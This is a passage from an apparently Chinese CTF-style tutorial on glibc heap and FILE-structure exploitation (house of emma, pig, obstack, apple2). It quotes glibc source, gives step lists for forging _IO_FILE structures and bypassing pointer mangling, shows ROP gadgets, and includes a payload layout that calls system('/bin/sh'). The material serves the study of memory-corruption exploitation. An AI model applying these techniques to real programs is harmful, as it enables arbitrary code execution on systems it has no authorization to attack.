class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_write (FILE *fp, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write_cb = cfile-&gt;__io_functions.write; <span class="comment">//0xf0</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (write_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (write_cb == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">ssize_t</span> n = <span class="built_in">write_cb</span> (cfile-&gt;__cookie, buf, size);</span><br><span class="line">  <span class="keyword">if</span> (n &lt; size)</span><br><span class="line">    fp-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">off64_t</span></span><br><span class="line">_IO_cookie_seek (FILE *fp, <span class="type">off64_t</span> offset, <span class="type">int</span> dir)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek_cb = cfile-&gt;__io_functions.seek;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ((seek_cb == <span class="literal">NULL</span></span><br><span class="line">   || (<span class="built_in">seek_cb</span> (cfile-&gt;__cookie, &amp;offset, dir)</span><br><span class="line">       == <span class="number">-1</span>)</span><br><span class="line">   || offset == (<span class="type">off64_t</span>) <span class="number">-1</span>)</span><br><span class="line">  ? _IO_pos_BAD : offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line">_IO_cookie_close (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span> *cfile = (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close_cb = cfile-&gt;__io_functions.close;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (close_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (close_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">close_cb</span> (cfile-&gt;__cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这四个函数作为我们考虑范围内的函数，发现其中调用的函数都是<code>_IO_cookie_file</code>的一个成员</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Special file type for fopencookie function.  */</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">_IO_cookie_file</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_FILE_plus</span> __fp;</span><br><span class="line">  <span class="type">void</span> *__cookie;</span><br><span class="line">  <span class="type">cookie_io_functions_t</span> __io_functions;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IO_cookie_io_functions_t</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read;<span class="comment">/* Read bytes.  */</span></span><br><span class="line">  <span class="type">cookie_write_function_t</span> *write;<span class="comment">/* Write bytes.  */</span></span><br><span class="line">  <span class="type">cookie_seek_function_t</span> *seek;<span class="comment">/* Seek/tell file position.  */</span></span><br><span class="line">  <span class="type">cookie_close_function_t</span> *close;<span class="comment">/* Close file.  */</span></span><br><span class="line">&#125; <span class="type">cookie_io_functions_t</span>;</span><br></pre></td></tr></table></figure><p>但是我们发现</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  <span class="built_in">PTR_DEMANGLE</span> (seek_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>在Glibc2.34及以上版本中的函数都进行了指针加密</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff7e06774</span> &lt;_IO_cookie_write+<span class="number">20</span>&gt;:        ror    rax,<span class="number">0x11</span></span><br><span class="line"><span class="number">0x7ffff7e06778</span> &lt;_IO_cookie_write+<span class="number">24</span>&gt;:        <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x30</span></span><br></pre></td></tr></table></figure><p>显示右移0x11位，然后和tls里的一个数据进行了异或，因此我们只需要通过TSU，largebin attack等的手法将其改为一个特定的值，就能进行绕过，反正要么泄露要么覆盖，只要能成就行</p><p>因此，利用思路如下：</p><ul><li>截至某个 <code>IO_FILE</code> 的指针（<code>IO_list_all/stdxxx-&gt;chain</code> 等都可以）为堆地址</li><li>堆上伪造 <code>IO_FILE</code> 结构，其 <code>vtable</code> 替换为<code>_IO_cookie_jumps+XX</code>，<code>XX</code> 为一个偏移量</li><li>伪造好函数指针和调用参数，指针需要循环异或和加密（在执行<code>_IO_cookie_write</code>的时候，rdi是fake_iofile，因此可以通过gadget来ROP）</li><li>调用到<code>_IO_cookie_read</code> 等函数，进而执行任意函数</li></ul><h3 id="相关技巧-17"><a href="#相关技巧-17" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><p>常用的 <code>gadget</code> 有：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">;栈迁移</span><br><span class="line">mov    rbp,QWORD PTR [rdi+<span class="number">0x48</span>]</span><br><span class="line">mov    rax,QWORD PTR [rbp+<span class="number">0x18</span>]</span><br><span class="line">lea    r13,[rbp+<span class="number">0x10</span>]</span><br><span class="line">mov    DWORD PTR [rbp+<span class="number">0x10</span>],<span class="number">0x0</span></span><br><span class="line">mov    rdi,r13</span><br><span class="line">call   QWORD PTR [rax+<span class="number">0x28</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">; rdi转rdx</span><br><span class="line">mov rdx, qword ptr [rdi + <span class="number">8</span>]</span><br><span class="line">mov qword ptr [rsp], rax</span><br><span class="line">call qword ptr [rdx + <span class="number">0x20</span>]</span><br></pre></td></tr></table></figure></li><li><p><code>pointer_guard</code> 就在 <code>canary</code> 下面，偏移可能需要爆破</p></li></ul><h3 id="利用效果-17"><a href="#利用效果-17" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>2021 湖湘杯的 House OF Emma</p><h2 id="house-of-pig"><a href="#house-of-pig" class="headerlink" title="house of pig"></a>house of pig</h2><h3 id="漏洞成因-19"><a href="#漏洞成因-19" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-19"><a href="#适用范围-19" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以进行 <code>largebin attack</code></li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-19"><a href="#利用原理-19" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<code>_IO_str_jumps</code> 中，存在着<code>_IO_str_overflow</code> 函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_str_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> flush_only = c == EOF;</span><br><span class="line">  <span class="type">size_t</span> pos;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_WRITES)</span><br><span class="line">      <span class="keyword">return</span> flush_only ? <span class="number">0</span> : EOF;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_TIED_PUT_GET) &amp;&amp; !(fp-&gt;_flags &amp; _IO_CURRENTLY_PUTTING))</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_flags |= _IO_CURRENTLY_PUTTING;</span><br><span class="line">      fp-&gt;_IO_write_ptr = fp-&gt;_IO_read_ptr;</span><br><span class="line">      fp-&gt;_IO_read_ptr = fp-&gt;_IO_read_end;</span><br><span class="line">    &#125;</span><br><span class="line">  pos = fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_base;</span><br><span class="line">  <span class="keyword">if</span> (pos &gt;= (<span class="type">size_t</span>) (_IO_blen (fp) + flush_only))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (fp-&gt;_flags &amp; _IO_USER_BUF) <span class="comment">/* not allowed to enlarge */</span></span><br><span class="line"><span class="keyword">return</span> EOF;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *new_buf;</span><br><span class="line">  <span class="type">char</span> *old_buf = fp-&gt;_IO_buf_base; <span class="comment">// 覆盖到这里</span></span><br><span class="line">  <span class="type">size_t</span> old_blen = _IO_blen (fp);</span><br><span class="line">  <span class="type">size_t</span> new_size = <span class="number">2</span> * old_blen + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; old_blen)</span><br><span class="line">    <span class="keyword">return</span> EOF;</span><br><span class="line">  new_buf = <span class="built_in">malloc</span> (new_size); <span class="comment">// 调用malloc</span></span><br><span class="line">  <span class="keyword">if</span> (new_buf == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/*  __ferror(fp) = 1; */</span></span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (old_buf)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memcpy</span> (new_buf, old_buf, old_blen);<span class="comment">// 调用memecpy，覆盖</span></span><br><span class="line">      <span class="built_in">free</span> (old_buf); <span class="comment">// 调用free</span></span><br><span class="line">      <span class="comment">/* Make sure _IO_setb won&#x27;t try to delete _IO_buf_base. */</span></span><br><span class="line">      fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="built_in">memset</span> (new_buf + old_blen, <span class="string">&#x27;\0&#x27;</span>, new_size - old_blen);</span><br><span class="line">      <span class="comment">//......</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_blen(fp) ((fp)-&gt;_IO_buf_end - (fp)-&gt;_IO_buf_base)</span></span><br></pre></td></tr></table></figure><p>只需要合理控制<code>_IO_buf_end</code>和<code>_IO_buf_base</code>就可以实现chunk的size可控，只要分配出来的chunk也可控，那么就可以在任意地址任意写</p><p>利用流程如下：</p><ul><li>先通过largebin attack将想控制的chunk_addr+0x18写上一个堆地址，然后通过tcache stashing unlink+使得分配的chunk可控</li><li>伪造一个<code>_IO_FILE_plus</code>结构，其vtable指向<code>_IO_str_jumps</code></li><li>然后伪造的<code>_IO_buf_base</code>为想写入的值的起点（所以要先在已知地址写入想写入的数据），之后合理控制<code>_IO_buf_end</code>实现控制分配chunk的大小</li><li>在 <code>memcpy</code> 中覆盖地址，如可以覆盖<code>__malloc_hook/__free_hook</code> 等</li></ul><p>该方法需要结合其他堆利用技术，需要保证 <code>malloc</code> 分配出来的 <code>chunk</code> 的地址是可控的。该方法主要提供了对 <code>IO</code> 系列函数中间接调用 <code>mallc/free/memcpy</code> 的组合利用。</p><h3 id="相关技巧-18"><a href="#相关技巧-18" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>可以 <code>largebin attack</code> 打掉 <code>mp_.tcachebins</code>，进而能把很大的 <code>chunk</code> 也放进入 <code>tcache</code> 进行管理</li><li>高版本没有 <code>hook</code> 的话，可以利用 <code>memcpy@got</code>，通过覆写 <code>got</code> 来进行 <code>rce</code></li><li>可以多次 <code>house of pig</code> 组合调用</li></ul><h3 id="利用效果-18"><a href="#利用效果-18" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li><li><code>ROP</code> 控制程序执行流</li></ul><h2 id="house-of-obstack"><a href="#house-of-obstack" class="headerlink" title="house of obstack"></a>house of obstack</h2><h3 id="漏洞成因-20"><a href="#漏洞成因-20" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-20"><a href="#适用范围-20" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以执行一次 <code>largebin attack</code></li><li>可以触发 <code>IO</code> 流操作</li></ul><h3 id="利用原理-20"><a href="#利用原理-20" class="headerlink" title="利用原理"></a>利用原理</h3><p>一条新的利用链，伪造 <code>vtable</code> 为<code>_IO_obstack_jumps</code>，然后调用到<code>_IO_obstack_xsputn</code>，紧接着调用 <code>obstack_grow</code>，其代码为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> obstack_grow(OBSTACK, where, length)                      \</span></span><br><span class="line"><span class="meta">  __extension__                                   \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);                       \</span></span><br><span class="line"><span class="meta">       int __len = (length);                              \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (_o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)                  \</span></span><br><span class="line"><span class="meta">     _obstack_newchunk (__o, __len);                      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);                     \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;                           \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br></pre></td></tr></table></figure><p>然后在<code>_obstack_newchunk</code> 调用了 <code>CALL_CHUNKFUN</code> 这个宏</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *old_chunk = h-&gt;chunk;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *new_chunk;</span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = <span class="built_in">CALL_CHUNKFUN</span> (h, new_size);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个宏会调用到函数指针：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_obstack_newchunk (<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *old_chunk = h-&gt;chunk;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_obstack_chunk</span> *new_chunk;</span><br><span class="line">  <span class="type">long</span> new_size;</span><br><span class="line">  <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">  <span class="type">long</span> i;</span><br><span class="line">  <span class="type">long</span> already;</span><br><span class="line">  <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">  new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">  <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">    new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">  new_chunk = <span class="built_in">CALL_CHUNKFUN</span> (h, new_size);</span><br><span class="line">  [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，其就是利用该函数指针进行控制程序的执行流。</p><h3 id="相关技巧-19"><a href="#相关技巧-19" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>伪造的 <code>IO_FILE</code> 布局如下：</p><ul><li>利用 <code>largebin attack</code> 伪造<code>_IO_FILE</code>，记完成伪造的 <code>chunk</code> 为 <code>A</code>（或者别的手法）</li><li><code>chunk A</code> 内偏移为 <code>0xd8</code> 处设为<code>_IO_obstack_jumps+0x20</code></li><li><code>chunk A</code> 内偏移为 <code>0xe0</code> 处设置 <code>chunk A</code> 的地址作为 <code>obstack</code> 结构体</li><li><code>chunk A</code> 内偏移为 <code>0x18</code> 处设为 <code>1</code>（<code>next_free</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x20</code> 处设为 <code>0</code>（<code>chunk_limit</code>）</li><li><code>chunk A</code> 内偏移为 <code>0x48</code> 处设为 <code>&amp;/bin/sh</code></li><li><code>chunk A</code> 内偏移为 <code>0x38</code> 处设为 <code>system</code> 函数的地址</li><li><code>chunk A</code> 内偏移为 <code>0x28</code> 处设为 <code>1</code>（<code>_IO_write_ptr</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x30</code> 处设为 <code>0</code> (<code>_IO_write_end</code>)</li><li><code>chunk A</code> 内偏移为 <code>0x50</code> 处设为 <code>1</code> (<code>use_extra_arg</code>)</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="built_in">flat</span>(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x18</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x20</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x28</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0x30</span>:<span class="number">0</span>,</span><br><span class="line">        <span class="number">0x38</span>:&amp;system,</span><br><span class="line">        <span class="number">0x48</span>:&amp;/bin/sh,</span><br><span class="line">        <span class="number">0x50</span>:<span class="number">1</span>,</span><br><span class="line">        <span class="number">0xd8</span>:&amp;_IO_obstack_jumps+<span class="number">0x20</span>,</span><br><span class="line">        <span class="number">0xe0</span>:chunkA,</span><br><span class="line">    &#125;</span><br><span class="line">    filler= <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><code>glibc-2.37</code> 开始这个方法的调用链为：<code>__printf_buffer_as_file_overflow -&gt; __printf_buffer_flush -&gt; __printf_buffer_flush_obstack-&gt;__obstack_newchunk</code>。</p><h3 id="利用效果-19"><a href="#利用效果-19" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li></ul><h2 id="house-of-apple2"><a href="#house-of-apple2" class="headerlink" title="house of apple2"></a>house of apple2</h2><h3 id="漏洞成因-21"><a href="#漏洞成因-21" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><ul><li>堆溢出</li></ul><h3 id="适用范围-21"><a href="#适用范围-21" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>已知 <code>heap</code> 地址和 <code>glibc</code> 地址</li><li>能控制程序执行 <code>IO</code> 操作，包括但不限于：从 <code>main</code> 函数返回、调用 <code>exit</code> 函数、通过<code>__malloc_assert</code> 触发</li><li>能控制<code>_IO_FILE</code> 的 <code>vtable</code> 和<code>_wide_data</code>，一般使用 <code>largebin attack</code> 去控制</li></ul><h3 id="利用原理-21"><a href="#利用原理-21" class="headerlink" title="利用原理"></a>利用原理</h3><p>在<code>_IO_wfile_jumps</code>的<code>_IO_wfile_overflow</code> 函数中</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_overflow (FILE *f, <span class="type">wint_t</span> wch)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (f-&gt;_flags &amp; _IO_NO_WRITES) <span class="comment">/* SET ERROR */</span></span><br><span class="line">    &#123;</span><br><span class="line">      f-&gt;_flags |= _IO_ERR_SEEN;</span><br><span class="line">      __set_errno (EBADF);</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">/* If currently reading or no buffer allocated. */</span></span><br><span class="line">  <span class="keyword">if</span> ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Allocate a buffer if needed. */</span></span><br><span class="line">      <span class="keyword">if</span> (f-&gt;_wide_data-&gt;_IO_write_base == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_wdoallocbuf (f);</span><br><span class="line">  _IO_free_wbackup_area (f);</span><br><span class="line">  _IO_wsetg (f, f-&gt;_wide_data-&gt;_IO_buf_base,</span><br><span class="line">     f-&gt;_wide_data-&gt;_IO_buf_base, f-&gt;_wide_data-&gt;_IO_buf_base);</span><br><span class="line">......</span><br><span class="line">    &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>调用<code>_IO_wdoallocbuf (f);</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_wdoallocbuf (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_buf_base)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (!(fp-&gt;_flags &amp; _IO_UNBUFFERED))</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WDOALLOCATE (fp) != WEOF)</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">  _IO_wsetb (fp, fp-&gt;_wide_data-&gt;_shortbuf,</span><br><span class="line">     fp-&gt;_wide_data-&gt;_shortbuf + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">libc_hidden_def</span> (_IO_wdoallocbuf)</span><br></pre></td></tr></table></figure><p>调用了<code>(wint_t)_IO_WDOALLOCATE (fp)</code>这个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)-&gt;FUNC) (THIS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_WIDE_JUMPS(THIS) \</span></span><br><span class="line"><span class="meta">  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, 